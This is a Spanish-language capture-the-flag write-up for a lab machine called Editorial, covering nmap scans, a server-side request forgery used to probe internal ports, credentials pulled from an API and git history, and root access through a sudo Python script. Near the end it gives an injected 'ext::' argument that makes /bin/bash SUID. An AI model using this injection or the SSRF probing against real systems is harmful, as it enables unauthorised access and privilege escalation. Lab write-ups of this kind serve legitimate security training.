---
title: Editorial
draft: false
tags:
---

Vamos a hacer un escaneo con [[Anotaciones/Herramientas/Nmap|Nmap]]
```bash
nmap -sS -n -Pn -p- --min-rate 5000 10.10.11.20 -oG allPorts
```

```txt
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

Ahora vamos a enumerar las versiones
```bash
nmap -sCV -p22,80 --min-rate 5000 -n -Pn -vvv 10.10.11.20 -oN Targeted
```

```
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0d:ed:b2:9c:e2:53:fb:d4:c8:c1:19:6e:75:80:d8:64 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMApl7gtas1JLYVJ1BwP3Kpc6oXk6sp2JyCHM37ULGN+DRZ4kw2BBqO/yozkui+j1Yma1wnYsxv0oVYhjGeJavM=
|   256 0f:b9:a7:51:0e:00:d5:7b:5b:7c:5f:bf:2b:ed:53:a0 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMXtxiT4ZZTGZX4222Zer7f/kAWwdCWM/rGzRrGVZhYx
80/tcp open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://editorial.htb
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Enumracion de la web
- Nombres
	> John Kat.
	> Stephen K.
	> José Sara.
- Email
	- `submissions@tiempoarriba.htb`
- Formulario
	![[{65855BC2-49F5-4133-B2BE-43796E6A97A4}.png]]

Investigando el formulario nos fijamos que si ponemos un servidor de nuestra maquina, la web hace una peticion a nuesta web y lo mas importante es que responde de forma difrernte si encuentra el servidor, es decir:
- Tengo un servidor web por el puerto 8000
	![[Pasted image 20241101161251.png]]
- si hago una peticion la web me contesta con esta cadena
	![[Pasted image 20241101161336.png]]
- pero si pongo un puerto que no esta abierto me pone esto
	![[Pasted image 20241101161402.png]]

esto significa que posiblemente podamos enumerar puestos internos de la maquina victima que no esten expuestos al exterior o los este filtrando un WAF, para hacer el reconocimiento de puertos internos vamos a hacer uso del intruder (`ctrl + i`) y cambiamos la ip a la de loopback
- marcamos el campo que va a cambiar
	![[Pasted image 20241101161647.png]]
- ahora configuramos el payload
	![[Pasted image 20241101161803.png]]
	ahora vamos a poner el campo que nos va a indicar si el puerto esta abierto o no
	![[Pasted image 20241101161907.png]]
- Ejecutamos el intruder (esto va a ir lento ya que la verion community no tiene hilos, siempre podriamos poner menos puertos o lo mas comunes)
	![[Pasted image 20241101161943.png]]

hemos encontrado un puerto interno abierto: `5000`
![[Pasted image 20241101162631.png]]
Vamos a ver cual es el varlo de la respuesta
![[{B638348C-C1EB-44F6-9A78-7F2BC49EF006}.png]]
parece que la respuesta del servidor la ha guardado en esa ruta, vamos a buscarla y descargarla para poder verla
```bash
cat 53ff3c95-2e30-424f-9e97-e142ec655d2b| jq
```
```Json
{
  "messages": [
    {
      "promotions": {
        "description": "Retrieve a list of all the promotions in our library.",
        "endpoint": "/api/latest/metadata/messages/promos",
        "methods": "GET"
      }
    },
    {
      "coupons": {
        "description": "Retrieve the list of coupons to use in our library.",
        "endpoint": "/api/latest/metadata/messages/coupons",
        "methods": "GET"
      }
    },
    {
      "new_authors": {
        "description": "Retrieve the welcome message sended to our new authors.",
        "endpoint": "/api/latest/metadata/messages/authors",
        "methods": "GET"
      }
    },
    {
      "platform_use": {
        "description": "Retrieve examples of how to use the platform.",
        "endpoint": "/api/latest/metadata/messages/how_to_use_platform",
        "methods": "GET"
      }
    }
  ],
  "version": [
    {
      "changelog": {
        "description": "Retrieve a list of all the versions and updates of the api.",
        "endpoint": "/api/latest/metadata/changelog",
        "methods": "GET"
      }
    },
    {
      "latest": {
        "description": "Retrieve the last version of api.",
        "endpoint": "/api/latest/metadata",
        "methods": "GET"
      }
    }
  ]
}
```
lo cual son muchos directorios y enpoins, vamos a ver si hay algo interesante, y el endpoint de welcome nos data unos credenciales
![[Pasted image 20241101163900.png]]
`dev/dev080217_devAPI!@`

Con estos credenciales podemos conectanos al ssh
![[Pasted image 20241101164009.png]]

Enumarcion
- usuario
	![[Pasted image 20241101164233.png]]
- repositorio de git
	![[{A457B390-2ADC-4356-81CD-3C87D6295DE2}.png]]

Cuando hay un repositior de git podemos enumerar cambios que se han producido en el repositorio
- vemos el status del repositorio(debemos estar en la misma carpeta que `.git`), se han borrado muchos archivos
```bash
git status
```
![[Pasted image 20241101165750.png]]
- Vamos a listar los log para ver los mensajes de los commits que ha ido haciendo, y vemos como que antes la api estaba corriendo como el usuario `prod` y ahora esta como dev
```bash
git log
o 
git log --oneline
```
![[Pasted image 20241101170258.png]]
- esto me hace pensar que podemos devoler el proyecto a un estado anterior donde `prod` era quien lo estaba ejecutando, vamos a ver que cambios tienen los archivos en esta version
```bash 
git log -p b73481b
```
![[Pasted image 20241101170510.png]]
- ya tenemos credenciales: `prod/080217_Producti0n_2023!@`

Cambiamos de usuario y enumeramos:
- Sudoers
	![[{A51620FF-A698-439C-B608-CD8CF62BC0E9}.png]]

si vemos el codigo vemos que lo que hace es clonar un repositorio pero podemos ver si algunas de las librerías que imporat tiene alguna vulnerability
![[{4DD7BAA9-0AA8-4DE7-B0F2-5AD1A2AA7121}.png]]
vamos a probar la vulnerabilidad
- vemos que no tiene permisos SUID
	![[Pasted image 20241101174527.png]]
- Ejecutamos (debe haber un porcetaje antes de cada espacio)
	- `sudo python3 clone_prod_change.py 'ext::sh -c chmod% u+s% /bin/bash'`
- y ahora ya podemos hacer `bash -p`
	![[Pasted image 20241101174731.png]]
